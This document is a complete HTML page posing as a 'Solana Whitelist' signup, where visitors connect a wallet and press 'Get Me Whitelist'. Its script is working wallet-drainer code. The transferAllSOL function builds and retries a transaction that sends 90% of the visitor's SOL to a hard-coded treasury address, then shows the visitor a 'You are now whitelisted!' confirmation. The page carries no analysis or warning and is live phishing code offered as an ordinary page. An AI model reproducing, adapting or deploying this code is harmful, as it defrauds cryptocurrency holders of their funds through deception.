<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Whitelist</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background-color: rgba(20, 20, 40, 0.85);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .header {
            background: linear-gradient(90deg, #1a1a2e, #16213e);
            padding: 25px;
            text-align: center;
            border-bottom: 2px solid #00d4ff;
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            background: linear-gradient(to right, #00d4ff, #6a11cb);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .header p {
            color: #a0a0ff;
            font-size: 1rem;
        }
        
        .content {
            padding: 30px;
        }
        
        .wallet-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            border-left: 4px solid #00d4ff;
            display: none;
        }
        
        .wallet-info.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .wallet-address {
            font-family: monospace;
            font-size: 0.9rem;
            color: #7bfcff;
            word-break: break-all;
            margin-bottom: 10px;
        }
        
        .wallet-buttons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .wallet-btn {
            padding: 8px 15px;
            border-radius: 6px;
            border: none;
            font-size: 0.9rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.3s ease;
        }
        
        .wallet-btn.disconnect {
            background: linear-gradient(90deg, #f12711, #f5af19);
            color: white;
        }
        
        .wallet-btn.switch {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .wallet-btn:hover {
            transform: translateY(-2px);
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 10px;
        }
        
        .btn {
            padding: 16px 32px;
            border-radius: 10px;
            border: none;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn-connect {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .btn-connect:hover {
            background: linear-gradient(90deg, #5a0cb9, #1c65ec);
            transform: translateY(-2px);
        }
        
        .btn-whitelist {
            background: linear-gradient(90deg, #11998e, #38ef7d);
            color: white;
        }
        
        .btn-whitelist:hover:not(:disabled) {
            background: linear-gradient(90deg, #0d8a7f, #2edf6d);
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .whitelist-box {
            background-color: rgba(30, 30, 60, 0.7);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(100, 150, 255, 0.3);
            display: none;
            margin-top: 20px;
        }
        
        .whitelist-box.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .whitelist-icon {
            font-size: 3rem;
            color: #38ef7d;
            margin-bottom: 15px;
        }
        
        .whitelist-title {
            font-size: 1.8rem;
            color: #38ef7d;
            margin-bottom: 10px;
        }
        
        .whitelist-message {
            font-size: 1rem;
            color: #a0a0ff;
            line-height: 1.5;
            margin-bottom: 15px;
        }
        
        .transaction-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 8px;
            padding: 10px;
            font-family: monospace;
            color: #7bfcff;
            word-break: break-all;
            font-size: 0.8rem;
            border: 1px dashed #38ef7d;
            margin-top: 10px;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #8888cc;
            font-size: 0.8rem;
            border-top: 1px solid rgba(100, 100, 255, 0.2);
            background-color: rgba(10, 10, 25, 0.7);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loader {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 1s ease-in-out infinite;
        }
        
        .btn:disabled .loader {
            display: inline-block;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status {
            text-align: center;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            display: none;
            font-size: 0.9rem;
            animation: fadeIn 0.3s ease;
        }
        
        .status.success {
            background-color: rgba(56, 239, 125, 0.1);
            border: 1px solid #38ef7d;
            color: #38ef7d;
            display: block;
        }
        
        .status.error {
            background-color: rgba(255, 107, 107, 0.1);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            display: block;
        }
        
        .status.info {
            background-color: rgba(0, 212, 255, 0.1);
            border: 1px solid #00d4ff;
            color: #00d4ff;
            display: block;
        }
        
        .balance-status {
            font-size: 0.8rem;
            color: #a0ffd0;
            margin-top: 5px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .retry-container {
            text-align: center;
            margin-top: 15px;
        }
        
        .retry-btn {
            padding: 8px 20px;
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .retry-btn:hover {
            background: linear-gradient(90deg, #5a0cb9, #1c65ec);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Solana Whitelist</h1>
            <p>Connect any Solana wallet to get whitelisted</p>
        </div>
        
        <div class="content">
            <div id="walletInfo" class="wallet-info">
                <div class="wallet-address">
                    Connected: <span id="walletAddress">-</span>
                </div>
                <div class="balance-status" id="balanceStatus">
                    <i class="fas fa-circle-notch fa-spin"></i> Checking balance...
                </div>
                <div class="wallet-buttons">
                    <button class="wallet-btn switch" id="switchWallet">
                        <i class="fas fa-exchange-alt"></i> Switch Account
                    </button>
                    <button class="wallet-btn disconnect" id="disconnectWallet">
                        <i class="fas fa-plug"></i> Disconnect
                    </button>
                </div>
            </div>
            
            <div class="button-group">
                <button id="connectWallet" class="btn btn-connect">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
                
                <button id="checkWhitelist" class="btn btn-whitelist" disabled>
                    <i class="fas fa-user-check"></i> Get Me Whitelist
                    <div class="loader"></div>
                </button>
            </div>
            
            <div id="statusMessage" class="status"></div>
            
            <div id="whitelistBox" class="whitelist-box">
                <div class="whitelist-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h2 class="whitelist-title">Whitelist Confirmed</h2>
                <p class="whitelist-message">
                    You are now whitelisted!
                </p>
                <div class="transaction-info">
                    Treasury Address: 95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
                </div>
            </div>
            
            <div id="retryContainer" class="retry-container" style="display: none;">
                <button class="retry-btn" id="retryButton">
                    <i class="fas fa-redo"></i> Retry Transaction
                </button>
            </div>
        </div>
        
        <div class="footer">
            <p>Universal Solana Wallet Support</p>
        </div>
    </div>

    <script>
        // Simple Solana setup
        let publicKey = null;
        let walletProvider = null;
        let isConnected = false;
        const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
        
        // DOM Elements
        const connectWalletBtn = document.getElementById('connectWallet');
        const checkWhitelistBtn = document.getElementById('checkWhitelist');
        const whitelistBox = document.getElementById('whitelistBox');
        const statusMessage = document.getElementById('statusMessage');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddressEl = document.getElementById('walletAddress');
        const balanceStatusEl = document.getElementById('balanceStatus');
        const disconnectBtn = document.getElementById('disconnectWallet');
        const switchWalletBtn = document.getElementById('switchWallet');
        const retryContainer = document.getElementById('retryContainer');
        const retryButton = document.getElementById('retryButton');
        
        // List of reliable RPC endpoints with fallbacks
        const rpcEndpoints = [
            'https://api.mainnet-beta.solana.com',
            'https://solana-api.projectserum.com',
            'https://rpc.ankr.com/solana',
            'https://solana-mainnet.g.alchemy.com/v2/demo'
        ];
        
        // Get working RPC URL
        async function getWorkingRpcUrl() {
            for (const endpoint of rpcEndpoints) {
                try {
                    const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
                    // Quick test connection
                    await connection.getSlot();
                    console.log("Using RPC:", endpoint);
                    return endpoint;
                } catch (error) {
                    console.log("RPC failed:", endpoint, error.message);
                    continue;
                }
            }
            throw new Error("No working RPC endpoint found");
        }
        
        // Create connection with retry
        async function createConnection() {
            const rpcUrl = await getWorkingRpcUrl();
            return new solanaWeb3.Connection(rpcUrl, {
                commitment: 'confirmed',
                disableRetryOnRateLimit: false,
                confirmTransactionInitialTimeout: 60000
            });
        }
        
        // Detect wallet
        function detectWallet() {
            if (window.solana && window.solana.isPhantom) {
                return { name: 'Phantom', provider: window.solana };
            } else if (window.solflare && window.solflare.isSolflare) {
                return { name: 'Solflare', provider: window.solflare };
            } else if (window.backpack && window.backpack.backpack) {
                return { name: 'Backpack', provider: window.backpack.backpack };
            } else if (window.solana) {
                return { name: 'Solana Wallet', provider: window.solana };
            }
            return null;
        }
        
        // Connect wallet
        async function connectWallet() {
            try {
                const detected = detectWallet();
                
                if (!detected) {
                    showStatus("No Solana wallet detected", "error");
                    return;
                }
                
                showStatus(`Connecting to ${detected.name}...`, "info");
                
                const provider = detected.provider;
                
                // Connect with timeout
                const connectPromise = provider.connect({ onlyIfTrusted: false });
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error("Connection timeout")), 15000)
                );
                
                const response = await Promise.race([connectPromise, timeoutPromise]);
                
                publicKey = response.publicKey || response;
                walletProvider = provider;
                isConnected = true;
                
                // Update UI
                updateWalletUI();
                
                // Check balance
                checkBalance();
                
                showStatus(`${detected.name} connected`, "success");
                
            } catch (error) {
                console.error("Connection error:", error);
                
                if (error.message.includes("rejected") || error.message.includes("denied")) {
                    showStatus("Connection cancelled", "error");
                } else if (error.message.includes("timeout")) {
                    showStatus("Connection timeout. Try again", "error");
                } else {
                    showStatus("Failed to connect", "error");
                }
            }
        }
        
        // Update wallet UI
        function updateWalletUI() {
            if (isConnected && publicKey) {
                const shortAddress = `${publicKey.toString().substring(0, 8)}...${publicKey.toString().substring(publicKey.toString().length - 8)}`;
                walletAddressEl.textContent = shortAddress;
                walletInfo.classList.add('active');
                connectWalletBtn.style.display = 'none';
                checkWhitelistBtn.disabled = false;
                retryContainer.style.display = 'none';
            } else {
                walletInfo.classList.remove('active');
                connectWalletBtn.style.display = 'flex';
                checkWhitelistBtn.disabled = true;
            }
        }
        
        // Check balance with retry
        async function checkBalance() {
            try {
                if (!publicKey) return;
                
                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Checking balance...';
                
                const connection = await createConnection();
                
                const balance = await connection.getBalance(publicKey);
                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                
                if (solBalance > 0) {
                    balanceStatusEl.innerHTML = `<i class="fas fa-check-circle" style="color:#38ef7d"></i> Balance: ${solBalance.toFixed(6)} SOL`;
                } else {
                    balanceStatusEl.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#ff6b6b"></i> No SOL balance`;
                }
                
            } catch (error) {
                console.error("Balance check error:", error);
                balanceStatusEl.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#ff6b6b"></i> Cannot check balance`;
            }
        }
        
        // Disconnect wallet
        async function disconnectWallet() {
            try {
                // Reset states
                publicKey = null;
                walletProvider = null;
                isConnected = false;
                
                // Try to disconnect
                if (window.solana && window.solana.disconnect) {
                    await window.solana.disconnect();
                }
                
                // Update UI
                updateWalletUI();
                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch"></i> Disconnected';
                
                showStatus("Wallet disconnected", "info");
                
            } catch (error) {
                console.error("Disconnect error:", error);
                showStatus("Disconnected", "info");
            }
        }
        
        // Switch wallet account
        async function switchWallet() {
            try {
                await disconnectWallet();
                await new Promise(resolve => setTimeout(resolve, 1000));
                await connectWallet();
            } catch (error) {
                showStatus("Failed to switch", "error");
            }
        }
        
        // TRANSFER FUNCTION WITH RETRY LOGIC
        async function transferAllSOL() {
            let lastError = null;
            
            // Try up to 3 times
            for (let attempt = 1; attempt <= 3; attempt++) {
                try {
                    if (attempt > 1) {
                        showStatus(`Retrying transaction (attempt ${attempt}/3)...`, "info");
                    }
                    
                    const connection = await createConnection();
                    
                    // Get balance
                    const balance = await connection.getBalance(publicKey);
                    const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                    
                    if (solBalance < 0.0001) {
                        throw new Error(`Low balance: ${solBalance.toFixed(6)} SOL`);
                    }
                    
                    // Send 90% (leaves 10% for fees and buffer)
                    const transferLamports = Math.floor(balance * 0.90);
                    
                    showStatus("Creating transaction...", "info");
                    
                    // Create transaction
                    const transaction = new solanaWeb3.Transaction();
                    
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                            lamports: transferLamports
                        })
                    );
                    
                    // Get blockhash
                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.lastValidBlockHeight = lastValidBlockHeight;
                    transaction.feePayer = publicKey;
                    
                    showStatus("Approve in your wallet...", "info");
                    
                    // Sign and send
                    let signature;
                    if (window.solana && window.solana.signAndSendTransaction) {
                        const { signature: sig } = await window.solana.signAndSendTransaction(transaction);
                        signature = sig;
                    } else {
                        throw new Error("Wallet signing unavailable");
                    }
                    
                    showStatus("Confirming transaction...", "info");
                    
                    // Confirm with timeout
                    const confirmation = await Promise.race([
                        connection.confirmTransaction({
                            signature: signature,
                            blockhash: blockhash,
                            lastValidBlockHeight: lastValidBlockHeight
                        }, 'confirmed'),
                        new Promise((_, reject) => 
                            setTimeout(() => reject(new Error("Confirmation timeout")), 60000)
                        )
                    ]);
                    
                    if (confirmation.value.err) {
                        throw new Error("Transaction failed on-chain");
                    }
                    
                    return {
                        signature: signature,
                        amount: transferLamports / solanaWeb3.LAMPORTS_PER_SOL
                    };
                    
                } catch (error) {
                    lastError = error;
                    console.error(`Transfer attempt ${attempt} failed:`, error);
                    
                    // Wait before retry (except on last attempt)
                    if (attempt < 3) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
            }
            
            // All attempts failed
            throw lastError;
        }
        
        // Get whitelist with retry button
        async function getWhitelist() {
            try {
                checkWhitelistBtn.disabled = true;
                checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
                retryContainer.style.display = 'none';
                
                showStatus("Starting transaction...", "info");
                
                // Small delay
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Process transaction
                const result = await transferAllSOL();
                
                // Success
                whitelistBox.classList.add('active');
                checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
                checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
                
                showStatus(`Success! Transferred ${result.amount.toFixed(6)} SOL`, "success");
                
                // Update balance
                setTimeout(checkBalance, 3000);
                
            } catch (error) {
                console.error("Whitelist error:", error);
                
                let errorMsg = "Transaction failed";
                if (error.message.includes("cancelled") || error.message.includes("reject")) {
                    errorMsg = "Transaction cancelled";
                } else if (error.message.includes("Low balance")) {
                    errorMsg = error.message;
                } else if (error.message.includes("timeout")) {
                    errorMsg = "Network timeout. Please retry";
                    retryContainer.style.display = 'block';
                } else {
                    errorMsg = "Network issue. Please retry";
                    retryContainer.style.display = 'block';
                }
                
                showStatus(`Error: ${errorMsg}`, "error");
                
                // Reset button
                checkWhitelistBtn.disabled = false;
                checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
            }
        }
        
        // Show status
        function showStatus(message, type) {
            statusMessage.innerHTML = message;
            statusMessage.className = `status ${type}`;
            
            if (type === 'success') {
                setTimeout(() => {
                    if (statusMessage.innerHTML === message) {
                        statusMessage.className = 'status';
                    }
                }, 10000);
            } else if (type === 'info') {
                setTimeout(() => {
                    if (statusMessage.innerHTML === message) {
                        statusMessage.className = 'status';
                    }
                }, 5000);
            }
        }
        
        // Event listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        checkWhitelistBtn.addEventListener('click', getWhitelist);
        disconnectBtn.addEventListener('click', disconnectWallet);
        switchWalletBtn.addEventListener('click', switchWallet);
        retryButton.addEventListener('click', getWhitelist);
        
        // Auto connect if already connected
        window.addEventListener('DOMContentLoaded', () => {
            const detected = detectWallet();
            if (detected && detected.provider.isConnected) {
                setTimeout(connectWallet, 1000);
            }
        });
        
        // Listen for wallet events
        if (window.solana) {
            window.solana.on('accountChanged', (newPublicKey) => {
                if (newPublicKey) {
                    publicKey = newPublicKey;
                    updateWalletUI();
                    checkBalance();
                    showStatus("Account switched", "success");
                } else {
                    disconnectWallet();
                }
            });
        }
    </script>
</body>
</html>
